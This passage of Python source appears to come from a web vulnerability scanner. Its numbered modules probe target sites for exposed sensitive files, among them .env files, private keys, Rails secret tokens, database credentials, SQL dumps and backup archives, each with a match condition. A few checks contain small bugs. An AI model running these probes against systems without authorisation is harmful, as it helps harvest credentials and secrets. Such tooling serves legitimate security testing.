  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# github-gemfile-files
def attMOD51(progScope):
  myKey = "95f3eaefbebd3be85dccc1d5d720b44f"
  vulnCat = "Exposure"
  vulnName = "Expo51"
  severity = "P4"
  vulnDsc = "Github Gemfiles"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/Gemfile','/Gemfile.lock']
  redirAllow = False
  statusF = 200
  textF = 'gem'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'https://rubygems.org' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# github-page-config
def attMOD52(progScope):
  myKey = "acdbb70aa2d5aefce13ac5818f18fb60"
  vulnCat = "Exposure"
  vulnName = "Expo52"
  severity = "P4"
  vulnDsc = "Github pages config file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/_config.yml']
  redirAllow = False
  statusF = 200
  textF = 'jekyll'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'title' in z.text and 'baseurl' in z.txt )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# glpi-status-domain-disclosure
def attMOD53(progScope):
  myKey = "f8272730d899d0185d130e9c00c8a1dc"
  vulnCat = "Exposure"
  vulnName = "Expo53"
  severity = "P4"
  vulnDsc = "GLPI Status Domain Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/status.php','/glpi/status.php','/glpi2/status.php']
  redirAllow = False
  statusF = 200
  textF = 'LDAP server'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# glpi-telemetry-disclosure
def attMOD54(progScope):
  myKey = "17e88bdba10392de76c232acab62f5bb"
  vulnCat = "Exposure"
  vulnName = "Expo54"
  severity = "P4"
  vulnDsc = "GLPI Telemetry Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ajax/telemetry.php','/glpi/ajax/telemetry.php']
  redirAllow = False
  statusF = 200
  textF = '"uuid":'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# gogs-install-exposure
def attMOD55(progScope):
  myKey = "95b7ff6deba9c728c143798fd0ff2677"
  vulnCat = "Exposure"
  vulnName = "Expo55"
  severity = "P2"
  vulnDsc = "Gogs install exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/install']
  redirAllow = False
  statusF = 200
  textF = 'Database Settings'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# iceflow-vpn-disclosure
def attMOD56(progScope):
  myKey = "38a1ead1cd21ef20c6aed194afa1ef03"
  vulnCat = "Exposure"
  vulnName = "Expo56"
  severity = "P4"
  vulnDsc = "ICEFlow VPN Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/log/system.log','/log/vpn.log','/log/access.log','/log/warn.log','/log/error.log','/log/debug.log','/log/mobile.log','/log/firewall.log']
  redirAllow = False
  statusF = 200
  textF = 'ICEFLOW VPN:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ioncube-loader-wizard
def attMOD57(progScope):
  myKey = "766dbb0ad3da7ce7a7a1b5f66ca619e3"
  vulnCat = "Exposure"
  vulnName = "Expo57"
  severity = "P3"
  vulnDsc = "Ioncube Loader Wizard disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ioncube/loader-wizard.php','/loader-wizard.php']
  redirAllow = False
  statusF = 200
  textF = 'ionCube Loader Wizard'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# joomla-file-listing
def attMOD58(progScope):
  myKey = "10a555f1e1e39f8f2f18329c9c8d9258"
  vulnCat = "Exposure"
  vulnName = "Expo58"
  severity = "P4"
  vulnDsc = "Joomla database files listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/libraries/joomla/database/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /libraries/joomla/database'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# keycloak-json
def attMOD59(progScope):
  myKey = "8ba49384c968f175dc0a91059b784392"
  vulnCat = "Exposure"
  vulnName = "Expo59"
  severity = "P4"
  vulnDsc = "Keycloak Json File"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/keycloak.json']
  redirAllow = False
  statusF = 200
  textF = 'auth-server-url'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# lazy-file-manager
def attMOD60(progScope):
  myKey = "8b1d3c7a3435d58c71dfd95532957ad5"
  vulnCat = "Exposure"
  vulnName = "Expo60"
  severity = "P3"
  vulnDsc = "Lazy File Manager"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/lfm.php']
  redirAllow = False
  statusF = 200
  textF = 'Lazy File Manager'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# php-user-ini-disclosure
def attMOD61(progScope):
  myKey = "89436ff7b26c9402b2b51d980723aeec"
  vulnCat = "Exposure"
  vulnName = "Expo61"
  severity = "P3"
  vulnDsc = "Php User.ini Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/user.ini','/.user.ini']
  redirAllow = False
  statusF = 200
  textF = 'mssql'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'highlight' in z.text and 'opcache' in z.text and 'oci8' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# phpunit
def attMOD62(progScope):
  myKey = "45448560ee73fa2c97a809f813dff8f0"
  vulnCat = "Exposures"
  vulnName = "Expo62"
  severity = "P4"
  vulnDsc = "phpunit.xml file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/phpunit.xml']
  redirAllow = False
  statusF = 200
  textF = '</phpunit>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<phpunit' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# putty-private-key-disclosure
def attMOD63(progScope):
  myKey = "b8c904b02aa3a491ec07a21c3c2b984e"
  vulnCat = "Exposure"
  vulnName = "Expo63"
  severity = "P3"
  vulnDsc = "Putty Private Key Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/my.ppk']
  redirAllow = False
  statusF = 200
  textF = 'PuTTY-User-Key-File'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# pyproject-disclosure
def attMOD64(progScope):
  myKey = "db57fed53bff4b83f3cf9bcec2875a93"
  vulnCat = "Exposure"
  vulnName = "Expo64"
  severity = "P4"
  vulnDsc = "Pyproject Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/pyproject.toml']
  redirAllow = False
  statusF = 200
  textF = '[build-system]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# rails-secret-token-disclosure
def attMOD65(progScope):
  myKey = "db240b3a45c38e775feac3e429bce1d5"
  vulnCat = "Exposure"
  vulnName = "Expo65"
  severity = "P3"
  vulnDsc = "Ruby on Rails Secret Token Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/initializers/secret_token.rb']
  redirAllow = False
  statusF = 200
  textF = 'secret_key_base ='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# sensitive-storage-data-expose
def attMOD66(progScope):
  myKey = "3d4eaffb6a9406c38dd5d5890fff2d2c"
  vulnCat = "Exposure"
  vulnName = "Expo66"
  severity = "P3"
  vulnDsc = "Sensitive Storage Data Exposed"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/storage/','/api_smartapp/storage/','/equipbid/storage/','/server/storage/','/intikal/storage/','/elocker_old/storage/']
  redirAllow = False
  statusF = 200
  textF = 'oauth-private.key'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# shellscripts
def attMOD67(progScope):
  myKey = "6e64453a1e88520f9840587efbe1e818"
  vulnCat = "Exposure"
  vulnName = "Expo67"
  severity = "P4"
  vulnDsc = "Public shellscripts"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.build.sh','/.jenkins.sh','/.travis.sh','/install.sh','/update.sh','/config.sh','/build.sh','/setup.sh','/run.sh','/backup.sh','/compile.sh','/env.sh','/init.sh','/startup.sh','/wp-setup.sh','/deploy.sh','/aws.sh']
  redirAllow = False
  statusF = 200
  textF = 'bin'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'bash' in z.text and 'sh' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# snyk-ignore-file-disclosure
def attMOD68(progScope):
  myKey = "455aa99b611c2ac9f849ca915d00cbb9"
  vulnCat = "Exposure"
  vulnName = "Expo68"
  severity = "P4"
  vulnDsc = "Snyk Ignore File Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.snyk']
  redirAllow = False
  statusF = 200
  textF = '# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# webpack-sourcemap-disclosure
def attMOD69(progScope):
  myKey = "a7307d1c78f97f4a2f551423405b7a75"
  vulnCat = "Exposure"
  vulnName = "Expo69"
  severity = "P4"
  vulnDsc = "yarn lock file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/yarn.lock']
  redirAllow = False
  statusF = 200
  textF = '# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# exposed-mysql-initial
def attMOD70(progScope):
  myKey = "3f3909900c82466dcdc02e57977f83ce"
  vulnCat = "Exposure"
  vulnName = "Expo70"
  severity = "P4"
  vulnDsc = "Exposed mysql.initial"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/mysql.initial.sql']
  redirAllow = False
  statusF = 200
  textF = 'Roundcube Webmail initial database structure'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# php-backup-files
def attMOD71(progScope):
  myKey = "07011c3bd2d99a71b1188f0c635b1e78"
  vulnCat = "Exposure"
  vulnName = "Expo71"
  severity = "P3"
  vulnDsc = "PHP source disclosure through backup files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/index.php.bak','/default.php.bak','/main.php.bak','/config.php.bak','/settings.php.bak','/header.php.bak','/footer.php.bak','/login.php.bak','/database.php.bak','/db.php.bak','/conn.php.bak','/db_config.php.bak','/404.php.bak','/wp-config.php.bak','/wp-login.php.bak']
  redirAllow = False
  statusF = 200
  textF = '<?php'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# settings-php-files
def attMOD72(progScope):
  myKey = "c388c735f38f0277d6f75a91a4b1e896"
  vulnCat = "Exposure"
  vulnName = "Expo72"
  severity = "P3"
  vulnDsc = "settings.php information disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/settings.php.bak','/settings.php.dist','/settings.php.old','/settings.php.save','/settings.php.swp','/settings.php.txt']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# default-sql-dump
def attMOD73(progScope):
  myKey = "a1e49b58dd6c8967470e5df8a00d2a61"
  vulnCat = "Exposure"
  vulnName = "Expo73"
  severity = "P3"
  vulnDsc = "MySQL Dump Files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/1.sql','/backup.sql','/database.sql','/data.sql','/db_backup.sql','/dbdump.sql','/db.sql','/dump.sql','/localhost.sql','/mysqldump.sql','/mysql.sql','/site.sql','/sql.sql','/temp.sql','/translate.sql','/users.sql','/wp-content/uploads/dump.sql']
  redirAllow = False
  statusF = 200
  textF = 'CREATE TABLE '
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'PRIMARY KEY ' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# zip-backup-files
def attMOD74(progScope):
  myKey = "30503fafabcea92c99713463e49eccc9"
  vulnCat = "Exposure"
  vulnName = "Expo74"
  severity = "P3"
  vulnDsc = "Compressed Web File"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/backup.7z','/backup.bz2','/backup.gz','/backup.lz','/backup.rar','/backup.tar.gz','/backup.xz','/backup.zip','/backup.z','/backup.tar.z','/backup.db','/backup.sqlite','/backup.sqlitedb','/backup.sql.7z','/backup.sql.bz2','/backup.sql.gz','/backup.sql.lz','/backup.sql.rar','/backup.sql.tar.gz','/backup.sql.xz','/backup.sql.zip','/backup.sql.z','/backup.sql.tar.z']
  redirAllow = False
  statusF = 200
  textF = 'backup'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# airflow-configuration-exposure
def attMOD75(progScope):
  myKey = "21f399d11bb0d82a61610c98fd726e84"
  vulnCat = "Exposure"
  vulnName = "Expo75"
  severity = "P3"
  vulnDsc = "Apache Airflow Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/airflow.cfg']
  redirAllow = False
  statusF = 200
  textF = '[core]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# alibaba-canal-info-leak
def attMOD76(progScope):
  myKey = "03d9eeb36fb4ed09c02bd10b93296429"
  vulnCat = "Exposure"
  vulnName = "Expo76"
  severity = "P4"
  vulnDsc = "Alibaba Canal Info Leak"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/v1/canal/config/1/1']
  redirAllow = False
  statusF = 200
  textF = 'ncanal.aliyun.accessKey'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# amazon-docker-config
def attMOD77(progScope):
  myKey = "8adb64b9fc9aafe3b7b56774893550fa"
  vulnCat = "Exposure"
  vulnName = "Epo77"
  severity = "P3"
  vulnDsc = "Dockerrun AWS Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/Dockerrun.aws.json']
  redirAllow = False
  statusF = 200
  textF = 'containerDefinitions'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ansible-config-disclosure
def attMOD78(progScope):
  myKey = "fc17f7d144f4086c29db2bf378848abe"
  vulnCat = "Exposure"
  vulnName = "Expo78"
  severity = "P3"
  vulnDsc = "Ansible Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ansible.cfg']
  redirAllow = False
  statusF = 200
  textF = '[inventory]'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# apache-config
def attMOD79(progScope):
  myKey = "13d046ce60ebb25b84f11e7060401dc3"
  vulnCat = "Exposure"
  vulnName = "Expo79"
  severity = "P4"
  vulnDsc = "Apache Config file disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/apache.conf']
  redirAllow = False
  statusF = 200
  textF = '</Directory>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# appspec-yml-disclosure
def attMOD80(progScope):
  myKey = "5bf75cd014a68b298333565ca72a8fcb"
  vulnCat = "Exposure"
  vulnName = "Expo80"
  severity = "P3"
  vulnDsc = "appspec-yml-disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/appspec.yml','/appspec.yaml']
  redirAllow = False
  statusF = 200
  textF = 'files:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'version:' in z.text and 'os:' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# awstats-config
def attMOD81(progScope):
  myKey = "cac42027be0420af2e063ad3052f686b"
  vulnCat = "Exposure"
  vulnName = "Expo81"
  severity = "P4"
  vulnDsc = "AWStats config"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/awstats/','/awstats.conf']
  redirAllow = False
  statusF = 200
  textF = 'AWSTATS CONFIGURE'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text or 'Index of /awstats' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# awstats-script
def attMOD82(progScope):
  myKey = "93fa2af001d7d926eafa932dfb582c2e"
  vulnCat = "Exposure"
  vulnName = "Expo8"
  severity = "P4"
  vulnDsc = "AWStats script"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/awstats.pl','/logs/awstats.pl','/webstats/awstats.pl']
  redirAllow = False
  statusF = 200
  textF = 'Do not remove this line'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# circleci-config
def attMOD83(progScope):
  myKey = "25d865ad995c14d5969e727d4c2a3380"
  vulnCat = "Exposure"
  vulnName = "Expo83"
  severity = "P4"
  vulnDsc = "circleci config.yml exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.circleci/config.yml']
  redirAllow = False
  statusF = 200
  textF = 'version:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'jobs:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# circleci-ssh-config
def attMOD84(progScope):
  myKey = "6a2782dfbb9fec98da1f6461d7343570"
  vulnCat = "Exposure"
  vulnName = "Expo84"
  severity = "P4"
  vulnDsc = "circleci ssh-config exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.circleci/ssh-config']
  redirAllow = False
  statusF = 200
  textF = 'IdentityFile'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# cisco-network-config
def attMOD85(progScope):
  myKey = "7453548e75d5b9fde63a18f7fb86fe4c"
  vulnCat = "Exposure"
  vulnName = "Expo85"
  severity = "P4"
  vulnDsc = "Cisco System Network Configuration Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/CGI/Java/Serviceability?adapter=device.statistics.configuration']
  redirAllow = False
  statusF = 200
  textF = 'Network Configuration'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# codeigniter-env
def attMOD86(progScope):
  myKey = "673ce24f70590273e27b34ac0e33eb86"
  vulnCat = "Exposure"
  vulnName = "Expo86"
  severity = "P2"
  vulnDsc = "Codeigniter .env file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.env.dev.local','/.env.development.local','/.env.prod.local','/.env.production.local','/.env.local','/.env.example','/.env.stage','/.env.live','/.env_1','/.env.old','/.env_sample']
  redirAllow = False
  statusF = 200
  textF = 'DB_PASSWORD'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'APP_PASSWORD' in z.text and 'DB_DATABASE' in z.text and 'APP_URL' in z.text and 'DB_host' in z.text and 'APP_ENV' in z.text and 'APP_KEY' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# composer-config
def attMOD87(progScope):
  myKey = "7446fa98275bd0916ce0232d195bf8f8"
  vulnCat = "Exposure"
  vulnName = "Expo87"
  severity = "P4"
  vulnDsc = "composer-config-file"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/composer.json','/composer.lock','/.composer/composer.json','/vendor/composer/installed.json']
  redirAllow = False
  statusF = 200
  textF = '"require": {'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Sensitive Configuration Files Listing
def attMOD88(progScope):
  myKey = "19e5b603fea7a5fcd4af8d1968b99f53"
  vulnCat = "Exposure"
  vulnName = "Expo88"
  severity = "P3"
  vulnDsc = "Sensitive Configuration Files Listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/configs/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /configs'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# coremail-config-disclosure
def attMOD89(progScope):
  myKey = "d2cf1b6ea188fb2f5bf7ea4f75d1ef9c"
  vulnCat = "Exposure"
  vulnName = "Expo89"
  severity = "P2"
  vulnDsc = "Coremail Config Disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/mailsms/s?func=ADMIN:appState&dumpConfig=/']
  redirAllow = False
  statusF = 200
  textF = '<object name="cm_md_db">'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '<string name="EnableCoremailSmtp">' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# dbeaver-credentials*********
def attMOD90(progScope):
  myKey = "8f8ef4a7df86d353d464f1b3253db183"
  vulnCat = "Exposure"
  vulnName = "Expo90"
  severity = "P2"
  vulnDsc = "DBeaver Credential Exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.dbeaver/credentials-config.json']
  redirAllow = False
  statusF = 200
  textF = 'password='
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# detect-drone-config
def attMOD91(progScope):
  myKey = "0daf5910ef47284a4961461a10aaaa8e"
  vulnCat = "Exposure"
  vulnName = "Expo91"
  severity = "P2"
  vulnDsc = "Detect Drone Configuration"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.drone.yml']
  redirAllow = False
  statusF = 200
  textF = 'kind:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# docker-compose-config
def attMOD92(progScope):
  myKey = "4fe72daef04d62623b3bef6158f771e8"
  vulnCat = "Exposure"
  vulnName = "Expo92"
  severity = "P3"
  vulnDsc = "docker-compose.yml exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/docker-compose.yml','/docker-compose.prod.yml','/docker-compose.production.yml','/docker-compose.staging.yml','/docker-compose.dev.yml','/docker-compose-dev.yml','/docker-compose.override.yml']
  redirAllow = False
  statusF = 200
  textF = 'version: '
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'services:' in z.text )) else False
  
